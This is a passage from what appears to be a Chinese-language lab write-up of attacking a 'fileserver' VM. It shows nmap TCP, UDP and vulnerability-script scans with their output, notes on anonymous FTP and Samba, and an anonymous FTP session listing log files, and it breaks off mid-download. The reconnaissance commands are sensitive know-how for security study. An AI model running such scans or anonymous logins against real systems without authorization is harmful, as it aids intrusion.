<span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">16</span> <span class="number">11</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fileserver (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00046</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp         vsftpd <span class="number">3</span>.<span class="number">0</span>.<span class="number">2</span></span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      <span class="built_in">At</span> session startup, client count was <span class="number">4</span></span><br><span class="line">|      vsFTPd <span class="number">3</span>.<span class="number">0</span>.<span class="number">2</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_drwxrwxrwx    <span class="number">3</span> <span class="number">0</span>        <span class="number">0</span>              <span class="number">16</span> Feb <span class="number">19</span>  <span class="number">2020</span> pub [NSE: writeable]</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh         OpenSSH <span class="number">7</span>.<span class="number">4</span> (protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">75</span>fa37d1624a15877e2183b92fff0493 (RSA)</span><br><span class="line">|   <span class="number">256</span> b8db2ccae270c3eb9aa8cc0ea21c686b (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">66</span>a31b55cac2518441217f774045d49f (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp    open  http        Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">6</span> ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-<span class="built_in">title</span>: My File Server</span><br><span class="line">|_http-server-header: Apache/<span class="number">2</span>.<span class="number">4</span>.<span class="number">6</span> (CentOS)</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span>-<span class="number">4</span> (RPC #<span class="number">100000</span>)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>        <span class="number">111</span>/tcp   rpcbind</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>        <span class="number">111</span>/udp   rpcbind</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">3</span>,<span class="number">4</span>          <span class="number">111</span>/tcp6  rpcbind</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">3</span>,<span class="number">4</span>          <span class="number">111</span>/udp6  rpcbind</span><br><span class="line">|   <span class="number">100003</span>  <span class="number">3</span>,<span class="number">4</span>         <span class="number">2049</span>/tcp   nfs</span><br><span class="line">|   <span class="number">100003</span>  <span class="number">3</span>,<span class="number">4</span>         <span class="number">2049</span>/tcp6  nfs</span><br><span class="line">|   <span class="number">100003</span>  <span class="number">3</span>,<span class="number">4</span>         <span class="number">2049</span>/udp   nfs</span><br><span class="line">|   <span class="number">100003</span>  <span class="number">3</span>,<span class="number">4</span>         <span class="number">2049</span>/udp6  nfs</span><br><span class="line">|   <span class="number">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">20048</span>/tcp   mountd</span><br><span class="line">|   <span class="number">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">20048</span>/tcp6  mountd</span><br><span class="line">|   <span class="number">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">20048</span>/udp   mountd</span><br><span class="line">|   <span class="number">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">20048</span>/udp6  mountd</span><br><span class="line">|   <span class="number">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">36541</span>/udp   nlockmgr</span><br><span class="line">|   <span class="number">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">41202</span>/udp6  nlockmgr</span><br><span class="line">|   <span class="number">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">51508</span>/tcp6  nlockmgr</span><br><span class="line">|   <span class="number">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">54552</span>/tcp   nlockmgr</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">44568</span>/tcp6  status</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">50635</span>/tcp   status</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">55325</span>/udp   status</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">58523</span>/udp6  status</span><br><span class="line">|   <span class="number">100227</span>  <span class="number">3</span>           <span class="number">2049</span>/tcp   nfs_acl</span><br><span class="line">|   <span class="number">100227</span>  <span class="number">3</span>           <span class="number">2049</span>/tcp6  nfs_acl</span><br><span class="line">|   <span class="number">100227</span>  <span class="number">3</span>           <span class="number">2049</span>/udp   nfs_acl</span><br><span class="line">|_  <span class="number">100227</span>  <span class="number">3</span>           <span class="number">2049</span>/udp6  nfs_acl</span><br><span class="line"><span class="number">445</span>/tcp   open  netbios-ssn Samba smbd <span class="number">4</span>.<span class="number">9</span>.<span class="number">1</span> (workgroup: SAMBA)</span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs_acl     <span class="number">3</span> (RPC #<span class="number">100227</span>)</span><br><span class="line"><span class="number">2121</span>/tcp  open  ftp         ProFTPD <span class="number">1</span>.<span class="number">3</span>.<span class="number">5</span></span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_Can&#x27;t get directory listing: ERROR</span><br><span class="line"><span class="number">20048</span>/tcp open  mountd      <span class="number">1</span>-<span class="number">3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:<span class="number">60</span>:<span class="number">69</span> (VMware)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 2.6.<span class="title">X</span>|3.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:2.6 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 2.6.32 - 3.10, <span class="title">Linux</span> 2.6.32 - 3.13, <span class="title">Linux</span> 3.10, <span class="title">Linux</span> 3.4 - 3.10</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Unix</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">script</span> <span class="title">results</span>:</span></span><br><span class="line"><span class="function">|<span class="title">_clock</span>-<span class="title">skew</span>: <span class="title">mean</span>: 6<span class="title">h10m00s</span>, <span class="title">deviation</span>: 3<span class="title">h10m30s</span>, <span class="title">median</span>: 7<span class="title">h59m59s</span></span></span><br><span class="line"><span class="function">| <span class="title">smb</span>-<span class="title">security</span>-<span class="title">mode</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">account_used</span>: &lt;<span class="title">blank</span>&gt;</span></span><br><span class="line"><span class="function">|   <span class="title">authentication_level</span>: <span class="title">user</span></span></span><br><span class="line"><span class="function">|   <span class="title">challenge_response</span>: <span class="title">supported</span></span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">message_signing</span>: <span class="title">disabled</span> (<span class="title">dangerous</span>, <span class="title">but</span> <span class="title">default</span>)</span></span><br><span class="line"><span class="function">| <span class="title">smb2</span>-<span class="title">time</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">date</span>: 2023-10-16<span class="title">T11</span>:01:36</span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">start_date</span>: <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function">| <span class="title">smb2</span>-<span class="title">security</span>-<span class="title">mode</span>: </span></span><br><span class="line"><span class="function">|   311: </span></span><br><span class="line"><span class="function">|<span class="title">_</span>    <span class="title">Message</span> <span class="title">signing</span> <span class="title">enabled</span> <span class="title">but</span> <span class="title">not</span> <span class="title">required</span></span></span><br><span class="line"><span class="function">| <span class="title">smb</span>-<span class="title">os</span>-<span class="title">discovery</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">OS</span>: <span class="title">Windows</span> 6.1 (<span class="title">Samba</span> 4.9.1)</span></span><br><span class="line"><span class="function">|   <span class="title">Computer</span> <span class="title">name</span>: <span class="title">localhost</span></span></span><br><span class="line"><span class="function">|   <span class="title">NetBIOS</span> <span class="title">computer</span> <span class="title">name</span>: <span class="title">FILESERVER</span>\<span class="title">x00</span></span></span><br><span class="line"><span class="function">|   <span class="title">Domain</span> <span class="title">name</span>: \<span class="title">x00</span></span></span><br><span class="line"><span class="function">|   <span class="title">FQDN</span>: <span class="title">localhost</span></span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">System</span> <span class="title">time</span>: 2023-10-16<span class="title">T16</span>:31:34+05:30</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 17.51 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><ul><li>21 ftp vsftpd 3.0.2 允许匿名登录，有一个可写的pub目录</li><li>22 ssh oepnshh 7.4 主机密钥类型有三种（RSA,ECDSA,ED25519）</li><li>80 apache服务，centos系统</li><li>111 rpc</li><li>445 samba</li><li>2049、2121、20048都是用rpc协议运行的服务（见111端口扫描结果）</li></ul></blockquote><h3 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA nmapscan/udp</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sU -top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA nmapscan/udp</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">16</span> <span class="number">10</span>:<span class="number">30</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fileserver (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00042</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line"><span class="number">53</span>/udp    filtered      domain</span><br><span class="line"><span class="number">67</span>/udp    filtered      dhcps</span><br><span class="line"><span class="number">68</span>/udp    filtered      dhcpc</span><br><span class="line"><span class="number">69</span>/udp    open|filtered tftp</span><br><span class="line"><span class="number">123</span>/udp   open|filtered ntp</span><br><span class="line"><span class="number">135</span>/udp   filtered      msrpc</span><br><span class="line"><span class="number">137</span>/udp   filtered      netbios-ns</span><br><span class="line"><span class="number">138</span>/udp   open|filtered netbios-dgm</span><br><span class="line"><span class="number">139</span>/udp   open|filtered netbios-ssn</span><br><span class="line"><span class="number">161</span>/udp   filtered      snmp</span><br><span class="line"><span class="number">162</span>/udp   open|filtered snmptrap</span><br><span class="line"><span class="number">445</span>/udp   open|filtered microsoft-ds</span><br><span class="line"><span class="number">500</span>/udp   filtered      isakmp</span><br><span class="line"><span class="number">514</span>/udp   filtered      syslog</span><br><span class="line"><span class="number">520</span>/udp   filtered      route</span><br><span class="line"><span class="number">631</span>/udp   open|filtered ipp</span><br><span class="line"><span class="number">1434</span>/udp  filtered      ms-sql-m</span><br><span class="line"><span class="number">1900</span>/udp  filtered      upnp</span><br><span class="line"><span class="number">4500</span>/udp  open|filtered nat-t-ike</span><br><span class="line"><span class="number">49152</span>/udp open|filtered unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:<span class="number">60</span>:<span class="number">69</span> (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8</span>.<span class="number">18</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h3 id="默认脚本漏洞扫描"><a href="#默认脚本漏洞扫描" class="headerlink" title="默认脚本漏洞扫描"></a>默认脚本漏洞扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -p21,<span class="number">22</span>,<span class="number">80</span>,<span class="number">111</span>,<span class="number">445</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">20048</span> -oA nmapscan/vuln</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -script=vuln <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -p21,<span class="number">22</span>,<span class="number">80</span>,<span class="number">111</span>,<span class="number">445</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">20048</span> -oA nmapscan/vuln </span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">16</span> <span class="number">10</span>:<span class="number">52</span> CST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     <span class="number">224</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">251</span></span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-<span class="number">2011</span>-<span class="number">1002</span>).</span><br><span class="line">|_  Hosts are all up (<span class="keyword">not</span> vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fileserver (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh</span><br><span class="line"><span class="number">80</span>/tcp    open  http</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-csrf: Couldn&#x27;t <span class="built_in">find</span> any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t <span class="built_in">find</span> any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t <span class="built_in">find</span> any stored XSS vulnerabilities.</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds</span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs</span><br><span class="line"><span class="number">2121</span>/tcp  open  ccproxy-ftp</span><br><span class="line"><span class="number">20048</span>/tcp open  mountd</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:<span class="number">60</span>:<span class="number">69</span> (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-<span class="number">054</span>: false</span><br><span class="line">|_smb-vuln-ms10-<span class="number">061</span>: false</span><br><span class="line">| smb-vuln-regsvc-dos: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Service regsvc <span class="keyword">in</span> Microsoft Windows systems vulnerable to denial of service</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       The service regsvc <span class="keyword">in</span> Microsoft Windows <span class="number">2000</span> systems is vulnerable to denial of service caused by a null deference</span><br><span class="line">|       pointer. This script will crash the service <span class="keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="line">|       while working on smb-enum-sessions.</span><br><span class="line">|_          </span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">68</span>.<span class="number">01</span> seconds</span><br></pre></td></tr></table></figure><ul><li>80端口没有新的信息发现</li><li>samba有可能有拒绝服务攻击，在渗透测试中不考虑这种方法</li></ul><p>没有特别值得注意的信息。</p></blockquote><h2 id="信息分析及渗透"><a href="#信息分析及渗透" class="headerlink" title="信息分析及渗透"></a>信息分析及渗透</h2><ul><li>21端口和2121端口 ftp 允许匿名登录，可以尝试登录获取其中文件</li><li>445 samba服务 可以用smbmap跑一下</li><li>111、2049、20048</li><li>80 http服务</li><li>22 ssh服务</li></ul><h3 id="尝试ftp匿名登录"><a href="#尝试ftp匿名登录" class="headerlink" title="尝试ftp匿名登录"></a>尝试ftp匿名登录</h3><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# ftp <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>          </span><br><span class="line">Connected to <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3</span>.<span class="number">0</span>.<span class="number">2</span>)</span><br><span class="line">Name (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>:root): anonymous</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line"><span class="function">Password: </span></span><br><span class="line"><span class="function">230 <span class="title">Login</span> <span class="title">successful</span>.</span></span><br><span class="line"><span class="function"><span class="title">Remote</span> <span class="title">system</span> <span class="title">type</span> <span class="title">is</span> <span class="title">UNIX</span>.</span></span><br><span class="line"><span class="function"><span class="title">Using</span> <span class="title">binary</span> <span class="title">mode</span> <span class="title">to</span> <span class="title">transfer</span> <span class="title">files</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">binary</span></span></span><br><span class="line"><span class="function">200 <span class="title">Switching</span> <span class="title">to</span> <span class="title">Binary</span> <span class="title">mode</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span> </span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5821|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function"><span class="title">drwxrwxrwx</span>    3 0        0              16 <span class="title">Feb</span> 19  2020 <span class="title">pub</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">cd</span> <span class="title">pub</span></span></span><br><span class="line"><span class="function">250 <span class="title">Directory</span> <span class="title">successfully</span> <span class="title">changed</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5926|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">xr</span>-<span class="title">x</span>    9 0        0            4096 <span class="title">Feb</span> 19  2020 <span class="title">log</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">pwd</span></span></span><br><span class="line"><span class="function"><span class="title">Remote</span> <span class="title">directory</span>: /<span class="title">pub</span></span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">cd</span> <span class="title">log</span></span></span><br><span class="line"><span class="function">250 <span class="title">Directory</span> <span class="title">successfully</span> <span class="title">changed</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||5478|).</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">xr</span>-<span class="title">x</span>    2 0        0            4096 <span class="title">Feb</span> 19  2020 <span class="title">anaconda</span></span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">x</span>---    2 0        0              22 <span class="title">Feb</span> 19  2020 <span class="title">audit</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0            7033 <span class="title">Feb</span> 19  2020 <span class="title">boot.log</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0           10752 <span class="title">Feb</span> 19  2020 <span class="title">btmp</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0            9161 <span class="title">Feb</span> 19  2020 <span class="title">cron</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0           31971 <span class="title">Feb</span> 19  2020 <span class="title">dmesg</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0           31971 <span class="title">Feb</span> 19  2020 <span class="title">dmesg.old</span></span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">xr</span>-<span class="title">x</span>    2 0        0               6 <span class="title">Feb</span> 19  2020 <span class="title">glusterfs</span></span></span><br><span class="line"><span class="function"><span class="title">drwx</span>------    2 0        0              39 <span class="title">Feb</span> 19  2020 <span class="title">httpd</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0          292584 <span class="title">Feb</span> 19  2020 <span class="title">lastlog</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0            3764 <span class="title">Feb</span> 19  2020 <span class="title">maillog</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0         1423423 <span class="title">Feb</span> 19  2020 <span class="title">messages</span></span></span><br><span class="line"><span class="function"><span class="title">drwx</span>------    2 0        0               6 <span class="title">Feb</span> 19  2020 <span class="title">ppp</span></span></span><br><span class="line"><span class="function"><span class="title">drwx</span>------    4 0        0              43 <span class="title">Feb</span> 19  2020 <span class="title">samba</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0           63142 <span class="title">Feb</span> 19  2020 <span class="title">secure</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0               0 <span class="title">Feb</span> 19  2020 <span class="title">spooler</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0               0 <span class="title">Feb</span> 19  2020 <span class="title">tallylog</span></span></span><br><span class="line"><span class="function"><span class="title">drwxr</span>-<span class="title">xr</span>-<span class="title">x</span>    2 0        0              22 <span class="title">Feb</span> 19  2020 <span class="title">tuned</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 0        0           58752 <span class="title">Feb</span> 19  2020 <span class="title">wtmp</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0             100 <span class="title">Feb</span> 19  2020 <span class="title">xferlog</span></span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-------    1 0        0           18076 <span class="title">Feb</span> 19  2020 <span class="title">yum.log</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; </span></span><br></pre></td></tr></table></figure><p>发现一些文件（基本都是日志文件），打算通通下载下来看一遍</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get 